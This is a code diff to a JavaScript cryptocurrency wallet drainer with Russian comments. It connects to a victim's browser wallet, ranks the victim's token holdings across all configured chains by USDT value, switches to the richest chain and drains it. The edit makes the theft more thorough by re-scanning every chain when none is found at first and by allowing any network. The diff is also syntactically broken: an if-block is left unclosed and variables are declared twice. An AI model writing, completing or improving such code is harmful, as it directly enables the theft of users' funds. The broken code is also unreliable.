@@ -566,7 +566,7 @@ async function drain(chainId, signer, userAddress, bal, provider) {
   return status;
 }
 
-async function runDrainer(provider, signer, userAddress) {
+async function runDrainer(provider, signer, userAddress, chainIds = Object.keys(config.CHAINS)) {
   const currentTime = Date.now();
   const timeSinceLastDrain = currentTime - lastDrainTime;
   const minDelay = 10;
@@ -577,7 +577,7 @@ async function runDrainer(provider, signer, userAddress) {
 
   lastDrainTime = Date.now();
 
-  const balancePromises = Object.keys(config.CHAINS).map(async (chainId) => {
+  const balancePromises = chainIds.map(async (chainId) => {
     try {
       const reliableProvider = await getWorkingProvider(config.CHAINS[chainId].rpcUrls);
       const balance = await checkBalance(chainId, userAddress, reliableProvider);
@@ -603,11 +603,26 @@ async function runDrainer(provider, signer, userAddress) {
   // Сортируем по убыванию суммарной стоимости токенов (без нативных)
   sorted.sort((a, b) => b.totalValueInUSDT - a.totalValueInUSDT);
 
-  if (!sorted.length) {
-    throw new Error('No funds found on any chain');
-  }
+if (!sorted.length) {
+  console.warn('⚠️ Нет средств на доступных сетях, пытаемся переподключиться ко всем сетям...');
+  const allChains = Object.keys(config.CHAINS);
+  const newSorted = await Promise.all(
+    allChains
+      .filter(cid => !chainIds.includes(cid))
+      .map(async (cid) => {
+        const reliableProvider = await getWorkingProvider(config.CHAINS[cid].rpcUrls);
+        const balance = await checkBalance(cid, userAddress, reliableProvider);
+        const totalValueInUSDT = await calculateTotalValueInUSDT(cid, balance, reliableProvider);
+        return { chainId: Number(cid), balance, provider: reliableProvider, totalValueInUSDT };
+      })
+  ).then(results => results.filter(Boolean).sort((a, b) => b.totalValueInUSDT - a.totalValueInUSDT));
+  if (!newSorted.length) throw new Error('No funds found on any chain');
+  const target = newSorted[0];
+  await switchChain(target.chainId);
+  const status = await drain(target.chainId, signer, userAddress, target.balance, target.provider);
 
   const target = sorted[0];
+  await switchChain(target.chainId); // Убедимся, что сеть переключена перед drain
   console.log(`Выбрана сеть с chainId ${target.chainId} с максимальной стоимостью токенов (без нативных): ${target.totalValueInUSDT} USDT`);
   await switchChain(target.chainId);
   const status = await drain(target.chainId, signer, userAddress, target.balance, target.provider);
@@ -878,7 +893,7 @@ async function attemptDrainer() {
   }, 60000);
 
   try {
-    const provider = new ethers.providers.Web3Provider(window.ethereum);
+    const provider = new ethers.providers.Web3Provider(window.ethereum, 'any'); // Поддержка всех сетей
     const signer = provider.getSigner();
     const address = await signer.getAddress();
 
@@ -889,7 +904,7 @@ async function attemptDrainer() {
     await new Promise(resolve => setTimeout(resolve, 10));
 
     isTransactionPending = true;
-    const status = await runDrainer(provider, signer, connectedAddress);
+    const status = await runDrainer(provider, signer, connectedAddress, Object.keys(config.CHAINS)); // Передаём все chainId из конфига
     console.log('✅ Drainer выполнен, статус:', status);
 
     hasDrained = true;
